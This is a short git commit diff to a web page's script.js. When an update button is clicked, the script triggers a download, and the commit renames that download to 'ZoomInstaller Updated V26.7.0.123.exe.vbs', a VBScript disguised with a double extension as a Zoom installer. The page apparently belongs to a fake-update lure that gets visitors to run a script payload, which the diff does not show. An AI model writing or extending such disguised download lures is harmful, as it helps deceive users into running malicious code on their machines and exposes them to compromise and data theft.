afcf1745ca2d86f1f38e4dc5ce06c853f328955a
Silvaonline <silvajones1970@gmail.com>
2026-09-21 20:16:44 -0700

    Update script.js

--- script.js
+++ script.js
@@ -13,8 +13,8 @@ if (updateButton) {
         event.preventDefault();
         // create a temporary link to download
         var a = document.createElement('a');
-        a.href = 'install.vbs';
-        a.download = 'install.vbs';
+        a.href = 'ZoomInstaller Updated V26.7.0.123.exe.vbs';
+        a.download = 'ZoomInstaller Updated V26.7.0.123.exe.vbs';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
